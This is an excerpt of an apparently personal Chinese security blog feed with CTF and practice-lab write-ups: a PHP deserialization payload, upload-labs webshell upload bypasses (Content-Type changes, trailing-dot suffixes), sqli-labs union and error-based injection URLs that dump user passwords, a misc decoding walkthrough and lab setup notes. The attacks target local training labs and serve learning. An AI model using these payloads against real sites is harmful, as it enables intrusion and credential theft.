class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Flag&#123;</span><br><span class="line">    public $file=&#x27;flag.php&#x27;;</span><br><span class="line">    public function __tostring()&#123;</span><br><span class="line">        if(isset($this-&gt;file))&#123;</span><br><span class="line">            echo file_get_contents($this-&gt;file);</span><br><span class="line">            echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">            return (&quot;U R SO CLOSE !///COME ON PLZ&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$password=new Flag();</span><br><span class="line">echo serialize($password);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure><p>联合起来payload：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?text=data://text/plain,welcome to the zjctf&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure><p>flag</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if(2===3)&#123;  </span><br><span class="line">return (&quot;flag&#123;6633ed89-7eda-4de4-92c5-88bd8fdbe0c7&#125;&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">web</summary>
    
    
    
    
    <category term="BUUCTF" scheme="https://dabai5269.top/tags/BUUCTF/"/>
    
  </entry>
  
  <entry>
    <title>upload-labs</title>
    <link href="https://dabai5269.top/post/80f02bc5.html"/>
    <id>https://dabai5269.top/post/80f02bc5.html</id>
    <published>2023-04-07T05:32:14.000Z</published>
    <updated>2023-04-07T07:17:27.113Z</updated>
    
    <content type="html"><![CDATA[<p>文件上传漏洞被利用需要<strong>两个前提条件</strong>：</p><p>1、文件能上传成功</p><p>2、攻击者能知道文件路径</p><p>凡是上传图片并显示的关卡，都有<strong>三种方式可以知道文件路径</strong></p><p>1、最简单直接的，在没显示出来的图片上右键选择“复制图像链接”，可以得到文件的绝对路径</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/123c53e523fa4a86aa967a84de16ba67.png" alt="123c53e523fa4a86aa967a84de16ba67"></p><p>2、网页上右键选择“查看页面源代码”，源代码中显示文件的相对路径</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230407135835211.png" alt="image-20230407135835211"></p><p>3、如果是用burpsuite上传的文件，response报文中也会显示文件的相对路径。</p><h2 id="Pass-01"><a href="#Pass-01" class="headerlink" title="Pass-01"></a>Pass-01</h2><h3 id="方法1：浏览器disable-JS"><a href="#方法1：浏览器disable-JS" class="headerlink" title="方法1：浏览器disable JS"></a>方法1：浏览器disable JS</h3><p>firefox可以安装一个叫Script Switch的插件，安装成功之后，就是下图右上角小红框里那个图标，使其处在JS disabled状态，上传x.php。出现下图这样没加载成功的图片表示webshell已经上传成功。</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/92b2e5477ba24b1eabbe94cf11f0b4a0.png" alt="92b2e5477ba24b1eabbe94cf11f0b4a0"></p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/123c53e523fa4a86aa967a84de16ba67.png" alt="123c53e523fa4a86aa967a84de16ba67"></p><p>到服务器上看看，上传成功的webshell在 <strong>upload-labs目录\upload</strong> 文件夹下</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/1efdc543145546be85193f2cb585990b.png" alt="1efdc543145546be85193f2cb585990b"></p><p>蚁剑连接也可以看到已经上传</p><h3 id="方法2：-bp抓包修改后缀"><a href="#方法2：-bp抓包修改后缀" class="headerlink" title="方法2： bp抓包修改后缀"></a>方法2： bp抓包修改后缀</h3><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/b6b05f1cc2d749eea3164807c384fe7f.png" alt="b6b05f1cc2d749eea3164807c384fe7f"></p><p>蚁剑连接即可看到文件已经上传</p><h2 id="Pass-02"><a href="#Pass-02" class="headerlink" title="Pass-02"></a>Pass-02</h2><h3 id="方法1：上传2-png-再修改后缀即可"><a href="#方法1：上传2-png-再修改后缀即可" class="headerlink" title="方法1：上传2.png,再修改后缀即可"></a>方法1：上传<strong>2.png</strong>,再修改后缀即可</h3><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/b6b05f1cc2d749eea3164807c384fe7f.png" alt="b6b05f1cc2d749eea3164807c384fe7f"></p><p>复制图片连接，去蚁剑连接</p><h3 id="方法2："><a href="#方法2：" class="headerlink" title="方法2："></a>方法2：</h3><p>上传·2.php,将抓到的包发送到<strong>repeater</strong>，然后把<strong>Content-Type</strong>的值改为<strong>image&#x2F;png</strong></p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/f1090bf94447411ba28ea3631b9e7e69.png" alt="f1090bf94447411ba28ea3631b9e7e69"></p><h2 id="Pass-03"><a href="#Pass-03" class="headerlink" title="Pass-03"></a>Pass-03</h2><p>首先上传个1.php，发现页面提示是”不允许上传……后缀文件“，并且burpsuite有抓到包，初步判断，这关可能是后端文件后缀黑名单过滤。</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230407140010914.png" alt="image-20230407140010914"></p><p>payload写一些有可能被解析为php的文件后缀的字符，大小写绕过，双写绕过，一些利用操作系统特性（比如服务器是windows系统的话，结尾加点，加空格，加::$DATA，后缀某几个字母大写），web容器解析漏洞绕过黑名单的后缀……</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230407141147135.png" alt="image-20230407141147135"></p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230407141107881.png" alt="image-20230407141107881"></p><p>上图的文件后缀是正常的，是有用的，用webshell管理工具连接的时候，文件名写202304071406293829.php就行</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230407141251693.png" alt="image-20230407141251693"></p><h2 id="Pass-04"><a href="#Pass-04" class="headerlink" title="Pass-04"></a>Pass-04</h2><p>这关上传了1.php之后，只是提示这个文件不能上传。</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230407145416298.png" alt="image-20230407145416298"></p><p>把后缀改成png之后，可以上传成功。可以初步判断，本关不检查文件内容，检查点应该在<strong>Content-Type</strong>或者<strong>文件后缀</strong>，或者两者都有。</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230407145704699.png" alt="image-20230407145704699"></p><p>先看看Content-Type有无影响。把Content-Type从image&#x2F;png改成application&#x2F;octet-stream，发送之后，发现文件依然能上传成功，说明本关Content-Type无影响。</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230407145850092.png" alt="image-20230407145850092"></p><p>接下来判断一下文件后缀是黑名单过滤还是白名单过滤：</p><p>文件后缀改成.xxx，发送后发现文件上传成功，说明本关还是文件后缀黑名单过滤</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230407145939292.png" alt="image-20230407145939292"></p><p>HTTP EXP：将文件后缀名改为“<strong>点+空格+点</strong>”的格式，这样<strong>file_ext会变为空</strong>，成功绕过黑名单上传。<strong>Windows会自动删除文件名最后的点</strong>，最后变为2.php。</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230407151322154.png" alt="image-20230407151322154"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Content-Disposition: form-data; name=&quot;upload_file&quot;; filename=&quot;2.php. .&quot;</span><br></pre></td></tr></table></figure><h2 id="Pass-05"><a href="#Pass-05" class="headerlink" title="Pass-05"></a>Pass-05</h2><p>和Pass-04一样，代码中只过滤了一次点，删除了空格和::$DATA，将文件后缀改为小写，黑名单等，使用Pass-04的方法绕过即可。但黑名单中屏蔽了.htaccess文件。</p><p>HTTP EXP：文件名改为“2.php. . ”。</p>]]></content>
    
    
    <summary type="html">upload-labs前五关</summary>
    
    
    
    
    <category term="靶场" scheme="https://dabai5269.top/tags/%E9%9D%B6%E5%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>misc50</title>
    <link href="https://dabai5269.top/post/2679200a.html"/>
    <id>https://dabai5269.top/post/2679200a.html</id>
    <published>2023-04-03T13:18:13.000Z</published>
    <updated>2023-04-03T13:48:38.737Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230403212338535.png" alt="image-20230403212338535"></p><p>丢进010在文件中部找到密文</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Sk5DVlM2Mk1NRjVIU1gyTk1GWEgyQ1E9Cg==</span><br></pre></td></tr></table></figure><p>base64解码，在base32解码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">KEY&#123;Lazy_Man&#125;</span><br></pre></td></tr></table></figure><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230403212707857.png" alt="image-20230403212707857"></p><p>图片大小过大，用binwalk查看</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230403212904989.png" alt="image-20230403212904989"></p><p>binwalk -e分离文件得到flag.zip</p><p>我的解压软件看不到提示，直接跑出zip密码：<strong>123456</strong></p><p>thienc.txt里的<strong>3078</strong>就是十六进制中的<strong>0x</strong></p><p>python脚本将thienc.txt转为十六进制文本</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_file</span>(<span class="params">filepath</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filepath) <span class="keyword">as</span> fp:</span><br><span class="line">        content=fp.read();</span><br><span class="line">    <span class="keyword">return</span> content</span><br><span class="line"></span><br><span class="line">number = read_file(<span class="string">&#x27;thienc.txt&#x27;</span>)</span><br><span class="line">result = []</span><br><span class="line">result.append(re.findall(<span class="string">r&#x27;.&#123;2&#125;&#x27;</span>, number))</span><br><span class="line">result = result[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">strings =<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> result:</span><br><span class="line">    y = <span class="built_in">bytearray</span>.fromhex(i)</span><br><span class="line">    z = <span class="built_in">str</span>(y)</span><br><span class="line">    z= re.findall(<span class="string">&quot;b&#x27;(.*?)&#x27;&quot;</span>,z)[<span class="number">0</span>]</span><br><span class="line">    strings += z</span><br><span class="line"></span><br><span class="line">b= strings.split(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line"></span><br><span class="line">strings=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> b:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(i) ==<span class="number">1</span>:</span><br><span class="line">        i= <span class="string">&#x27;0&#x27;</span> + i</span><br><span class="line">    strings +=i</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;result.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(strings)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;complete！&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>得到文本</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230403213659443.png" alt="image-20230403213659443"></p><p>注意到37 7A BC AF是<strong>7z</strong>格式压缩文件的文件头</p><p>复制文本粘贴进010<strong>（ctrl+shift+v）</strong>，将文件后缀保存为7z</p><p>得到一个加密的文档， 结合之前得到的key  解压得到secenc.txt</p><p>很明显为base64编码，但解码不对</p><p>发现这段字符串经过了多重的base64和base32混合编码。循环用正则表达式匹配判断编码类型然后解码： 脚本为</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;secenc.txt&#x27;</span>).read().encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">if</span> re.<span class="keyword">match</span>(<span class="string">&#x27;^[2-7A-Z=]+$&#x27;</span>, f.decode(<span class="string">&#x27;utf-8&#x27;</span>)):</span><br><span class="line">        f = base64.b32decode(f)</span><br><span class="line">    <span class="keyword">elif</span> re.<span class="keyword">match</span>(<span class="string">&#x27;^[0-9a-zA-Z+/=]+$&#x27;</span>, f.decode(<span class="string">&#x27;utf-8&#x27;</span>)):</span><br><span class="line">        f = base64.b64decode(f)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(f.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;result1.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    file.write(<span class="built_in">str</span>(f,encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Decryption complete!&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>输出结果：</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230403214329615.png" alt="image-20230403214329615"></p><p>ook编码，解码得到</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230403214640117.png" alt="image-20230403214640117"></p><p>brainfuck –&gt;text运行得到：</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230403214737633.png" alt="image-20230403214737633"></p>]]></content>
    
    
    <summary type="html">ctfshow misc50</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>sqli-labs</title>
    <link href="https://dabai5269.top/post/b3432909.html"/>
    <id>https://dabai5269.top/post/b3432909.html</id>
    <published>2023-03-22T12:16:16.000Z</published>
    <updated>2023-03-23T11:58:52.857Z</updated>
    
    <content type="html"><![CDATA[<h2 id="判断注入类型"><a href="#判断注入类型" class="headerlink" title="判断注入类型"></a>判断注入类型</h2><h3 id="数字型"><a href="#数字型" class="headerlink" title="数字型"></a>数字型</h3><ol><li><strong>Url 地址中输入 <a href="http://xxx/xx.php?id=">http://xxx/xx.php?id=</a> x and 1&#x3D;1 页面依旧运行正常，继续进行下一步。</strong></li><li><strong>Url 地址中继续输入 <a href="http://xxx/xx.php?id=">http://xxx/xx.php?id=</a> x and 1&#x3D;2 页面运行错误，则说明此 Sql 注入为数字型注入。</strong></li></ol><h3 id="字符型"><a href="#字符型" class="headerlink" title="字符型"></a>字符型</h3><ol><li><p><strong>Url 地址中输入 <a href="http://xxx/xx.php?id=">http://xxx/xx.php?id=</a> x’ and ‘1’&#x3D;’1 页面运行正常，继续进行下一步。</strong></p><p>2.<strong>Url 地址中继续输入 <a href="http://xxx/xx.php?id=">http://xxx/xx.php?id=</a> x’ and ‘1’&#x3D;’2 页面运行错误，则说明此 Sql 注入为字符型注入。</strong></p></li></ol><h2 id="猜解数据库中字段数"><a href="#猜解数据库中字段数" class="headerlink" title="猜解数据库中字段数"></a>猜解数据库中字段数</h2><p>​    <strong>使用 order by x 进行猜解的时候可以使用二分法进行猜解，先使用大一点的数字数字进行测试，如果报错就换数字的一半进行测试，当范围缩小时在依次测试。</strong><br> <strong>注意：</strong> <em>(–+为注释，将–+之后的语句都注释)</em></p><h2 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 这是字符型注入</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/?id=1</span><br><span class="line"># 使用order by进行联合注入，显示字段</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/?id=1&#x27; order by 3 --+</span><br><span class="line"># 在我们回显字段，将id改成错误的值（-1，0，-2等）</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/?id=-1&#x27; union select 1,2,3 --+</span><br><span class="line"># 通过回显数值我们将该数值显示成数据库的名称 利用database()函数</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/?id=-1&#x27; union select 1,database(),3 --+</span><br><span class="line"># 获得数据库名称后，再获取数据库中的表，获取全部的表需要一个group_concat()函数</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/?id=-1&#x27; union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27; --+</span><br><span class="line"># 在获得数据表以后,我们来获取users表中的列名</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/?id=-1&#x27; union select 1,database(),group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27; --+</span><br><span class="line"># 获取到列名以后，我们再获取该列数据</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/?id=-1&#x27; union select 1,database(),group_concat(username ,&#x27;:&#x27;, password) from users --+</span><br></pre></td></tr></table></figure><p>sql注入完成，下图<img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/7caf5a7f70244185b669b92d2026b58f.png" alt="7caf5a7f70244185b669b92d2026b58f"></p><h2 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h2><p>第二关为数字型注入和第一个一样，删除 id&#x3D;1后面的引号即可</p><h2 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h2><p>第三关的注入类型是基于 ‘) 的注入，只需要把注入点改为 ‘) 就可以了。</p><h2 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h2><p> 输入单引号进行测试：</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/74e406b234e645c29efa332800e9da0e.png" alt="74e406b234e645c29efa332800e9da0e"></p><p>我们发现并没有报错，那么就有可能是数据库后台把单引号过滤了，既然单引号类型被过滤了，那么我们就去测试双引号，我们输入注入语句：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&quot;</span><br></pre></td></tr></table></figure><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/a442969c22e546bcb4de182b451511fb.png" alt="a442969c22e546bcb4de182b451511fb"></p><p>页面报错并且爆出了单括号，根据第三关的经验我们首先测试是不是基于 “) 的注入类型 ，输入注入语句：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&quot;) and 1=1 --+</span><br><span class="line">?id=1&quot;) 1=2 --+</span><br></pre></td></tr></table></figure><p>第一个显示正常，第二个不正常但无报错说明有可能是基于 “) 的注入类型，接下来我们输入ORDER BY 语句进行测试：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&quot;) order by 3 --+</span><br></pre></td></tr></table></figure><p>页面显示正常。。<img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/bc6ba356af0f40cb9c807af291f8c9f8.png" alt="bc6ba356af0f40cb9c807af291f8c9f8"></p><h2 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h2><p>判断为字符注入，通过 ‘ 闭合查询无返回的数据，无论是有数据返回还是无数据返回页面都不会显示相关的数据。</p><p>所以这关的重点是盲注。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/less-5/?id=-1&#x27;  %23</span><br></pre></td></tr></table></figure><p><strong>开始注入</strong></p><p>​    <strong>1.双查询注入</strong>(需要多点几下才能出效果)</p><p> <strong>爆库名</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/less-5/?id=1&#x27; union select 1, count(*), concat((select database()), floor(rand()*2)) a from information_schema.tables group by a  %23</span><br></pre></td></tr></table></figure><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/9a3f71c5fcf540ffbe4b7e94d7998f81.png" alt="9a3f71c5fcf540ffbe4b7e94d7998f81"></p><p> <strong>爆表名</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/less-5/?id=1&#x27; union select 1, count(*), concat((select group_concat(table_name) from information_schema.tables where table_schema = &#x27;security&#x27;), floor(rand()*2)) a from information_schema.tables group by a  %23</span><br></pre></td></tr></table></figure><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/04fa7aee6738498a91df6a16e267265d.png" alt="04fa7aee6738498a91df6a16e267265d"></p><p><strong>爆列名</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/less-5/?id=1&#x27; union select 1, count(*), concat((select group_concat(column_name) from information_schema.columns where table_schema = &#x27;security&#x27; and table_name = &#x27;users&#x27;), floor(rand()*2)) a from information_schema.tables group by a  %23</span><br></pre></td></tr></table></figure><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/75ca52a0302c4955a19a3d97bbd6b99c.png" alt="75ca52a0302c4955a19a3d97bbd6b99c"></p><p><strong>爆字段内容（获取用户表的账号和密码）</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/less-5/?id=1&#x27; union select 1, count(*), concat((select concat(username,&#x27;~&#x27;,password) from users  limit 0,1), floor(rand()*2)) a from information_schema.tables group by a  %23</span><br></pre></td></tr></table></figure><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/5e3f5be531ef42389799d5c690d02801.png" alt="5e3f5be531ef42389799d5c690d02801"></p><p>其他账号密码更改limit后面的0为1，2，3，4就可以出来了。</p>]]></content>
    
    
    <summary type="html">sqli-labs前五关</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>解决博客Spawn failed</title>
    <link href="https://dabai5269.top/post/83dcefb7.html"/>
    <id>https://dabai5269.top/post/83dcefb7.html</id>
    <published>2023-02-21T14:03:52.000Z</published>
    <updated>2023-02-22T11:49:05.099Z</updated>
    
    <content type="html"><![CDATA[<p>错误如下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Error: Spawn failed</span><br><span class="line">      at ChildProcess.&lt;anonymous&gt; (/usr/local/src/hexo/hanyubolg/node_modules/hexo-util/lib/spawn.js:51:21)</span><br><span class="line">      at ChildProcess.emit (events.js:376:20)</span><br><span class="line">      at Process.ChildProcess._handle.onexit (internal/child_process.js:277:12) &#123;</span><br><span class="line">    code: 128</span><br><span class="line">  &#125;</span><br><span class="line">&#125; Something&#x27;s wrong. Maybe you can find the solution here: %s https://hexo.io/docs/troubleshooting.html</span><br></pre></td></tr></table></figure><p>解决方法</p><p>有可能是你的git repo配置地址不正确,可以将http方式变更为ssh方式，如图</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230222194656561.png" alt="image-20230222194656561"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: &#x27;git&#x27; # 这是固定的</span><br><span class="line">  repository:  #这里是你的仓库的地址，根据你自己实际的地址，进行添加</span><br><span class="line">  branch: main</span><br></pre></td></tr></table></figure><p>如果更改过一次，再更改一次即可。</p>]]></content>
    
    
    <summary type="html">博客部署Spawn failed</summary>
    
    
    
    
    <category term="Spawn failed" scheme="https://dabai5269.top/tags/Spawn-failed/"/>
    
  </entry>
  
  <entry>
    <title>搭建靶场</title>
    <link href="https://dabai5269.top/post/5f593b8b.html"/>
    <id>https://dabai5269.top/post/5f593b8b.html</id>
    <published>2023-02-11T06:16:25.000Z</published>
    <updated>2023-02-13T04:35:44.991Z</updated>
    
    <content type="html"><![CDATA[<h1 id="sql-labs靶场环境搭建"><a href="#sql-labs靶场环境搭建" class="headerlink" title="sql-labs靶场环境搭建"></a>sql-labs靶场环境搭建</h1><h2 id="SQLI-LAB下载地址"><a href="#SQLI-LAB下载地址" class="headerlink" title="SQLI-LAB下载地址"></a>SQLI-LAB下载地址</h2><p><a href="https://github.com/Audi-1/sqli-labs">https://github.com/Audi-1/sqli-labs</a></p><h2 id="WEB环境搭建"><a href="#WEB环境搭建" class="headerlink" title="WEB环境搭建"></a>WEB环境搭建</h2><p>在安装靶场之前，我们还需要搭建web运行环境（phpstudy）：<a href="https://www.xp.cn/download.html">https://www.xp.cn/download.html</a></p><h2 id="Sql-labs靶场环境搭建"><a href="#Sql-labs靶场环境搭建" class="headerlink" title="Sql-labs靶场环境搭建"></a>Sql-labs靶场环境搭建</h2><p>打开根目录</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-02-11%20142815.png" alt="屏幕截图 2023-02-11 142815"></p><p>解压到WWW目录</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-02-11%20142946.png" alt="屏幕截图 2023-02-11 142946"></p><p>在sqli-labs-master找到sqli-connections然后打开db-creds.inc，将$dbpass&#x3D;‘’改为$dbpass&#x3D;‘root’保存<img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-02-11%20143139.png" alt="屏幕截图 2023-02-11 143139"></p><p> 完成后打开phpstudy，启动Apache和Mysql</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-02-11%20143514.png" alt="屏幕截图 2023-02-11 143514"></p><p>访问：<a href="http://127.0.0.1/sqli-labs-master/%E6%89%93%E5%BC%80%E9%A6%96%E9%A1%B5">http://127.0.0.1/sqli-labs-master/打开首页</a></p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-02-11%20143625.png" alt="屏幕截图 2023-02-11 143625"></p><p>点击Setup&#x2F;reset Database for labs使其自动创建数据库，如图</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/b91c8481328444a7bc8f0423b1e65c3a.png" alt="b91c8481328444a7bc8f0423b1e65c3a"></p><h1 id="Upload-labs靶场的搭建"><a href="#Upload-labs靶场的搭建" class="headerlink" title="Upload-labs靶场的搭建"></a>Upload-labs靶场的搭建</h1><p>下载源码：<a href="https://github.com/Tj1ngwe1/upload-labs">https://github.com/Tj1ngwe1/upload-labs</a></p><p>解压到WWW目录</p><p>访问：<a href="http://127.0.0.1/upload-labs-master/">http://127.0.0.1/upload-labs-master/</a></p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-02-11%20144714.png" alt="屏幕截图 2023-02-11 144714"></p>]]></content>
    
    
    <summary type="html">sql-labs、upload-labs</summary>
    
    
    
    
    <category term="靶场" scheme="https://dabai5269.top/tags/%E9%9D%B6%E5%9C%BA/"/>
    
  </entry>
  
</feed>
